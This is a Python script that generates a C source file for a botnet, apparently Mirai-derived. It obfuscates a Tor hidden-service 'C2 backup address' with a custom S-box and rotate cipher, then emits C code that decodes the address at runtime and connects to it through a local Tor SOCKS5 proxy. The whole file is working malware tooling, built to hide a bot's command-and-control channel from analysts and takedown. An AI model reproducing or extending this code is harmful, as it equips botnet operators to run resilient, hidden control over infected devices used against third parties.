#!/usr/bin/env python3
"""Generate bot/core/onion.c with SPN-obfuscated .onion address."""

import sys, random

def generate_sbox(seed):
    rng = random.Random(seed)
    values = list(range(256))
    rng.shuffle(values)
    sbox = bytes(values)
    inv = bytearray(256)
    for i, v in enumerate(values):
        inv[v] = i
    return sbox, bytes(inv)

SBOX, SBOX_INV = generate_sbox(0xC1A24B8E_DEADBEEF)
SBOX2, SBOX2_INV = generate_sbox(0x7F3E9D5C_2B1A4806)

ONION_KEY_BASE = 0x9D

def rol8(b, n):
    n &= 7
    return ((b << n) | (b >> (8 - n))) & 0xFF

def ror8(b, n):
    return rol8(b, (8 - n) & 7)

def encode(host):
    out = bytearray()
    for i, ch in enumerate(host):
        b = ord(ch)
        b ^= (ONION_KEY_BASE + (i * 0x3F) + ((i * i) & 0xFF)) & 0xFF
        b = SBOX[b]
        b = rol8(b, (i + 3) & 7)
        b ^= (ONION_KEY_BASE ^ 0x5A + (i * 0x17)) & 0xFF
        b = SBOX2[b]
        b = rol8(b, (i + 7) & 7)
        out.append(b)
    return bytes(out)

def decode(data):
    out = []
    for i, b in enumerate(data):
        b = ror8(b, (i + 7) & 7)
        b = SBOX2_INV[b]
        b ^= (ONION_KEY_BASE ^ 0x5A + (i * 0x17)) & 0xFF
        b = ror8(b, (i + 3) & 7)
        b = SBOX_INV[b]
        b ^= (ONION_KEY_BASE + (i * 0x3F) + ((i * i) & 0xFF)) & 0xFF
        out.append(chr(b & 0xFF))
    return ''.join(out)

def generate_c_source(host, encoded):
    lines = []
    lines.append('/* Encoded .onion C2 backup address */')
    lines.append('#include "onion.h"')
    lines.append('')
    lines.append('#include <string.h>')
    lines.append('#include <arpa/inet.h>')
    lines.append('#include <fcntl.h>')
    lines.append('#include <unistd.h>')
    lines.append('#include <errno.h>')
    lines.append('')

    lines.append(f'#define ONION_KEY_BASE {ONION_KEY_BASE:#04x}')
    lines.append('')

    lines.append('static const unsigned char onion_sbox_inv[256] = {')
    for i in range(0, 256, 16):
        lines.append('    ' + ', '.join(f'0x{b:02X}' for b in SBOX_INV[i:i+16]) + ',')
    lines.append('};')
    lines.append('')
    lines.append('static const unsigned char onion_sbox2_inv[256] = {')
    for i in range(0, 256, 16):
        lines.append('    ' + ', '.join(f'0x{b:02X}' for b in SBOX2_INV[i:i+16]) + ',')
    lines.append('};')
    lines.append('')

    lines.append('static unsigned char onion_encoded[] = {')
    lines.append(f'    {", ".join(f"0x{b:02x}" for b in encoded)}')
    lines.append('};')
    lines.append(f'static int onion_encoded_len = {len(encoded)};')
    lines.append('static int onion_enabled = 1;')
    lines.append('')
    lines.append('static char onion_decoded[64] = {{0}};')
    lines.append('static int onion_ready = 0;')
    lines.append('')
    lines.append('#define TOR_PROXY_ADDR  INET_ADDR(127,0,0,1)')
    lines.append('#define TOR_PROXY_PORT  9050')
    lines.append('')

    lines.append('static unsigned char onion_ror8(unsigned char b, int n) {')
    lines.append('    n &= 7;')
    lines.append('    return (b >> n) | (b << (8 - n));')
    lines.append('}')
    lines.append('')
    lines.append('static unsigned char onion_rol8(unsigned char b, int n) {')
    lines.append('    n &= 7;')
    lines.append('    return (b << n) | (b >> (8 - n));')
    lines.append('}')
    lines.append('')

    lines.append('void onion_init(void)')
    lines.append('{')
    lines.append('    if (onion_ready) return;')
    lines.append('    int i;')
    lines.append('    for (i = 0; i < onion_encoded_len; i++) {')
    lines.append('        unsigned char b = onion_encoded[i];')
    lines.append('')
    lines.append('        b = onion_ror8(b, (i + 7) & 7);')
    lines.append('        b = onion_sbox2_inv[b];')
    lines.append('        b ^= (unsigned char)((ONION_KEY_BASE ^ 0x5A) + (i * 0x17));')
    lines.append('')
    lines.append('        b = onion_ror8(b, (i + 3) & 7);')
    lines.append('        b = onion_sbox_inv[b];')
    lines.append('        b ^= (unsigned char)(ONION_KEY_BASE + (i * 0x3F) + ((i * i) & 0xFF));')
    lines.append('')
    lines.append('        onion_decoded[i] = (char)b;')
    lines.append('    }')
    lines.append('    onion_decoded[onion_encoded_len] = 0;')
    lines.append('    onion_ready = 1;')
    lines.append('}')
    lines.append('')
    lines.append('char *onion_get_host(void) {')
    lines.append('    if (!onion_ready) onion_init();')
    lines.append('    return onion_decoded;')
    lines.append('}')
    lines.append('')
    lines.append('int onion_enabled_check(void) {')
    lines.append('    return onion_enabled;')
    lines.append('}')
    lines.append('')

    # SOCKS5 handshake/connect (unchanged from original)
    lines.append('''
static int socks5_handshake(int fd)
{
    unsigned char greet[] = {0x05, 0x01, 0x00};
    unsigned char resp[2];
    if (write(fd, greet, sizeof(greet)) != sizeof(greet))
        return -1;
    if (read(fd, resp, 2) != 2)
        return -1;
    if (resp[0] != 0x05 || resp[1] != 0x00)
        return -1;
    return 0;
}

static int socks5_connect(int fd, char *host, uint16_t port)
{
    int hlen = util_strlen(host);
    unsigned char req[256];
    unsigned char resp[10];
    int req_len = 7 + hlen;
    req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03;
    req[4] = (unsigned char)hlen;
    util_memcpy(&req[5], host, hlen);
    req[5 + hlen] = (port >> 8) & 0xFF;
    req[5 + hlen + 1] = port & 0xFF;
    if (write(fd, req, req_len) != req_len)
        return -1;
    if (read(fd, resp, 10) != 10)
        return -1;
    if (resp[0] != 0x05 || resp[1] != 0x00)
        return -1;
    return 0;
}

int onion_connect(int *out_fd, char *onion_host, uint16_t onion_port)
{
    struct sockaddr_in proxy_addr;
    int fd;
    if (!onion_enabled || onion_host == NULL)
        return -1;
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) return -1;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_addr.s_addr = TOR_PROXY_ADDR;
    proxy_addr.sin_port = htons(TOR_PROXY_PORT);
    if (connect(fd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) == -1)
        { close(fd); return -1; }
    if (socks5_handshake(fd) == -1)
        { close(fd); return -1; }
    if (socks5_connect(fd, onion_host, onion_port) == -1)
        { close(fd); return -1; }
    *out_fd = fd;
    return 0;
}
''')
    return '\n'.join(lines)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <address>.onion [output_file]", file=sys.stderr)
        sys.exit(1)
    host = sys.argv[1].strip()
    if not host.endswith('.onion'):
        host += '.onion'
    encoded = encode(host)
    dec = decode(encoded)
    assert dec == host, f"Roundtrip failed: {dec!r} != {host!r}"
    source = generate_c_source(host, encoded)
    if len(sys.argv) > 2:
        with open(sys.argv[2], 'w') as f:
            f.write(source)
    else:
        print(source)
